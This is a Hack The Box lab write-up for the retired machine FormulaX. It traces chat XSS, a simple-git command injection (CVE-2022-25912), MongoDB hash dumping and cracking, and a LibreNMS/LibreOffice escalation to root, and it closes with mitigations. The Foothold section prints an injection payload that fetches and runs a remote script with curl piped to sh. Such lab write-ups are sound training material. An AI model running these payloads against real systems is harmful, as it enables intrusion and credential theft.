---
machine: FormulaX
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, xss, simple-git, mongodb, librenms, libreoffice]
---

# FormulaX — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real flags or credentials.

## TL;DR

A Socket.IO chat reflects messages and allows XSS to read the admin history, revealing a subdomain. There, `simple-git` is vulnerable to command injection (CVE-2022-25912). Mongo leaks hashes, and LibreNMS/LibreOffice chain the escalation to root.

## Recon

```bash
nmap -Pn -sCV -p22,80,3000 <IP>
```

- Ports: `22/tcp` SSH, `80/tcp` HTTP and `3000/tcp` Node.js.
- Services: Chat application, reporting panel and internal LibreNMS.
- Technologies: Node.js, Socket.IO, simple-git, MongoDB, SNMP, LibreOffice.

## Enumeration

- `formulax.htb` with a Socket.IO chat.
- Reporting subdomain disclosed in the admin history.
- Form that clones repositories with `simple-git`.
- LibreNMS and MongoDB on the internal network.

## Foothold

Inject JavaScript into the chat to exfiltrate the admin conversation. The discovered subdomain runs a vulnerable `simple-git`; submit a URL with Git options that execute a command.

```bash
# XSS in the chat to read the admin history
curl -s http://formulax.htb/chat
# simple-git payload (CVE-2022-25912)
curl -s -b cookies.txt -X POST http://reports.formulax.htb/api/clone \
  -d 'repo=ext::sh -c "curl http://<IP>/s | sh"'
```

## Lateral movement

The shell exposes Mongo and a crackable user hash; reuse the password for the next hop. LibreNMS provides more credentials and host access.

## Privilege escalation

An SNMP trap triggers XSS in LibreNMS and performs actions as a more privileged user. The shared configuration leads to an account that can call the LibreOffice Calc API, which executes commands as root.

```bash
mongosh mongodb://127.0.0.1/formulax --eval 'db.users.find()'
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
snmpwalk -v2c -c public <IP>
# Chain the LibreNMS XSS and the LibreOffice API for the final command
```

## Evidence

- Admin history exfiltrated via XSS.
- `simple-git` command callback.
- Cracked hash and LibreNMS access; root shell.

## Lessons learned

- Internal chats are a source of vhosts and credentials.
- A vulnerable Git dependency turns a URL into execution.
- The SNMP/XSS/API chain shows internal panels are attack surface too.

## Mitigation and detection

- Escape messages and enforce a strict CSP in the chat.
- Patch `simple-git` and validate URLs against allowed schemes.
- Segment LibreNMS, rotate credentials and never run LibreOffice as root.

## References

- [0xdf — FormulaX](https://0xdf.gitlab.io/2024/08/17/htb-formulax.html)
- [IppSec — FormulaX](https://www.youtube.com/watch?v=k8eGslngxR4)
- [Hack The Box — FormulaX](https://app.hackthebox.com/machines/formulax)
